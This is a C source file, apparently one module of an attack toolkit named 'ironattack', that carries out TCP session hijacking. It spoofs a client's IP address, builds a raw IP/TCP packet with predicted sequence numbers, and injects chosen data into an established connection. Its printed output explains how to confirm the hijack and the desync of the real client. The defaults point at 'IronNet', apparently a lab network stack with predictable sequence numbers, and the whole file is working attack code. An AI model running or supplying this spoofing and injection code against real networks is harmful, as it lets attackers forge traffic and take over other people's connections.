/*
 * session_hijack.c — TCP Session Hijacking (Phase 22a)
 *
 * Injects data into an established TCP connection by spoofing the client's IP
 * and using the predicted sequence number. The server accepts the injected data
 * as if it came from the legitimate client.
 *
 * Usage:
 *   sudo ./ironattack session-hijack --target <ip> --port <port> \
 *       --client <ip> --sport <port> --seq <n> --ack <n> \
 *       --inject <text> [--iface <name>]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/ip.h>

static uint16_t checksum(const void *data, int len) {
    const uint8_t *p = data;
    uint32_t sum = 0;
    for (int i = 0; i < len - 1; i += 2)
        sum += (p[i] << 8) | p[i + 1];
    if (len & 1) sum += p[len - 1] << 8;
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xFFFF);
    return ~sum & 0xFFFF;
}

static uint16_t tcp_checksum(uint32_t src_ip, uint32_t dst_ip,
                             const uint8_t *tcp, int tcp_len) {
    uint32_t sum = 0;
    uint8_t *s = (uint8_t *)&src_ip;
    uint8_t *d = (uint8_t *)&dst_ip;
    sum += (s[0] << 8) | s[1]; sum += (s[2] << 8) | s[3];
    sum += (d[0] << 8) | d[1]; sum += (d[2] << 8) | d[3];
    sum += 6; sum += tcp_len;
    for (int i = 0; i < tcp_len - 1; i += 2)
        sum += (tcp[i] << 8) | tcp[i + 1];
    if (tcp_len & 1) sum += tcp[tcp_len - 1] << 8;
    while (sum >> 16) sum = (sum >> 16) + (sum & 0xFFFF);
    return ~sum & 0xFFFF;
}

int cmd_session_hijack(int argc, char **argv) {
    const char *target_str = NULL, *client_str = NULL, *inject_str = NULL;
    const char *iface = "iron0";
    uint16_t dst_port = 7, src_port = 0;
    uint32_t seq = 0, ack = 0;

    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "--target") == 0 && i + 1 < argc) target_str = argv[++i];
        else if (strcmp(argv[i], "--client") == 0 && i + 1 < argc) client_str = argv[++i];
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) dst_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--sport") == 0 && i + 1 < argc) src_port = atoi(argv[++i]);
        else if (strcmp(argv[i], "--seq") == 0 && i + 1 < argc) seq = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--ack") == 0 && i + 1 < argc) ack = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--inject") == 0 && i + 1 < argc) inject_str = argv[++i];
        else if (strcmp(argv[i], "--iface") == 0 && i + 1 < argc) iface = argv[++i];
    }

    if (!target_str || !client_str || !inject_str) {
        fprintf(stderr, "Error: --target, --client, and --inject required\n");
        fprintf(stderr, "Usage: ironattack session-hijack --target <server-ip> --port <port>\n");
        fprintf(stderr, "       --client <client-ip> --sport <client-port>\n");
        fprintf(stderr, "       --seq <next-seq> --ack <next-ack> --inject <text>\n");
        fprintf(stderr, "\nIronNet TCP predictable values:\n");
        fprintf(stderr, "  After handshake: client seq=1001, server seq=1001\n");
        fprintf(stderr, "  After client sends N bytes: seq=1001+N, ack=1001\n");
        return 1;
    }

    struct in_addr target_addr, client_addr;
    inet_pton(AF_INET, target_str, &target_addr);
    inet_pton(AF_INET, client_str, &client_addr);

    int inject_len = strlen(inject_str);

    /* Default seq/ack if not specified (IronNet predictable values) */
    if (seq == 0) seq = 1001; /* default: right after handshake */
    if (ack == 0) ack = 1001;
    if (src_port == 0) src_port = 54321; /* common ephemeral port */

    printf("=== TCP Session Hijacking (Phase 22a) ===\n");
    printf("  Target server: %s:%d\n", target_str, dst_port);
    printf("  Spoofed as:    %s:%d (client)\n", client_str, src_port);
    printf("  Sequence:      %u\n", seq);
    printf("  Ack:           %u\n", ack);
    printf("  Inject:        \"%s\" (%d bytes)\n", inject_str, inject_len);
    printf("  Iface:         %s\n\n", iface);

    printf("  Attack: Craft TCP data packet that appears to come from the client.\n");
    printf("  If seq matches server's rcv_nxt, data is accepted as legitimate.\n\n");

    /* Open raw socket */
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) {
        fprintf(stderr, "Error: cannot open raw socket (run with sudo)\n");
        return 1;
    }
    int one = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr));

    /* Build IP + TCP + payload */
    int tcp_len = 20 + inject_len;
    int ip_total = 20 + tcp_len;
    uint8_t pkt[512];
    memset(pkt, 0, sizeof(pkt));

    /* IP header */
    pkt[0] = 0x45;
    pkt[2] = (ip_total >> 8) & 0xFF; pkt[3] = ip_total & 0xFF;
    pkt[8] = 64; pkt[9] = 6; /* TCP */
    memcpy(pkt + 12, &client_addr.s_addr, 4); /* src = client (spoofed!) */
    memcpy(pkt + 16, &target_addr.s_addr, 4); /* dst = server */
    uint16_t ip_ck = checksum(pkt, 20);
    pkt[10] = (ip_ck >> 8) & 0xFF; pkt[11] = ip_ck & 0xFF;

    /* TCP header */
    uint8_t *tcp = pkt + 20;
    tcp[0] = (src_port >> 8) & 0xFF; tcp[1] = src_port & 0xFF;
    tcp[2] = (dst_port >> 8) & 0xFF; tcp[3] = dst_port & 0xFF;
    /* Sequence number */
    tcp[4] = (seq >> 24) & 0xFF; tcp[5] = (seq >> 16) & 0xFF;
    tcp[6] = (seq >> 8) & 0xFF; tcp[7] = seq & 0xFF;
    /* Ack number */
    tcp[8] = (ack >> 24) & 0xFF; tcp[9] = (ack >> 16) & 0xFF;
    tcp[10] = (ack >> 8) & 0xFF; tcp[11] = ack & 0xFF;
    tcp[12] = (5 << 4); /* data offset = 5 */
    tcp[13] = 0x18; /* ACK + PSH */
    tcp[14] = 0xFF; tcp[15] = 0xFF; /* window */
    /* Payload */
    memcpy(tcp + 20, inject_str, inject_len);
    /* TCP checksum */
    uint16_t tck = tcp_checksum(client_addr.s_addr, target_addr.s_addr, tcp, tcp_len);
    tcp[16] = (tck >> 8) & 0xFF; tcp[17] = tck & 0xFF;

    /* Send */
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_addr = target_addr;

    int rc = sendto(fd, pkt, ip_total, 0, (struct sockaddr *)&dst, sizeof(dst));
    close(fd);

    if (rc > 0) {
        printf("  [SENT] Injected %d bytes as %s:%d → %s:%d (seq=%u)\n",
               inject_len, client_str, src_port, target_str, dst_port, seq);
        printf("\n  Expected server behavior:\n");
        printf("    - If seq matches rcv_nxt: DATA ACCEPTED (hijack successful!)\n");
        printf("    - Echo server will echo back \"%s\"\n", inject_str);
        printf("    - Server advances rcv_nxt by %d\n", inject_len);
        printf("    - Client's next real packet (same seq) will be REJECTED (desync)\n");
        printf("\n  To verify:\n");
        printf("    ironctl> show tcp\n");
        printf("    Look for the connection %s:%d → %s:%d\n", client_str, src_port, target_str, dst_port);
        printf("    If rcv_nxt advanced by %d, the injection was accepted.\n", inject_len);
    } else {
        printf("  [FAILED] sendto returned %d\n", rc);
    }

    printf("\n  Session hijacking vs RST injection:\n");
    printf("    RST injection:     KILLS the connection (destructive)\n");
    printf("    Session hijacking: INJECTS data into connection (constructive)\n");
    printf("    Both require knowing the seq number.\n");

    return 0;
}
